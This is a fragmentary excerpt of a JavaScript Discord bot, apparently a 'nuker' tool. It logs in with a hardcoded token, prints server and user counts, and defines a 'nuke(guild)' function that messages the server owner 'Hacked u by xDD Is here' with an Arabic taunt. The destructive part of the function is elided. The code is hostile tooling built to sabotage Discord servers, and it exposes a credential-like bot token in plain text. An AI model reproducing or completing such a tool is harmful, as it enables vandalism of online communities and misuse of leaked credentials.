...
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  Sasuke-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by xDD Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
...
LOka.login("NTkyNzkyNTgzMzM2MzYyMDE0.XREisQ.JmMUu-XqJddCQvuXb7wDnL9yCW8")
